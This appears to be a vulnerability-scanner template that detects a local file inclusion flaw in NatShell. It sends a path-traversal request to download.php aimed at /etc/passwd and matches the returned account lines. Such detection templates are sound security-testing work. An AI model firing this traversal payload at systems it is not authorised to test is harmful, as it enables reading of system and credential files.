id: "natshell-path-traversal"
name: "NatShell - Local File Inclusion"
severity: "high"
description: "NatShell is vulnerable to local file inclusion."
tech:
  - "php"
tags:
  - "natshell"
  - "lfi"
  - "vuln"
cwe: "CWE-22"
reference: "https://mp.weixin.qq.com/s/g4YNI6UBqIQcKL0TRkKWlw"
spaExclusion: true
request:
  method: "GET"
  path: "/download.php?file=../../../../../etc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "toor:[x*]:0:0"
  - type: "status"
    status:
      - 200
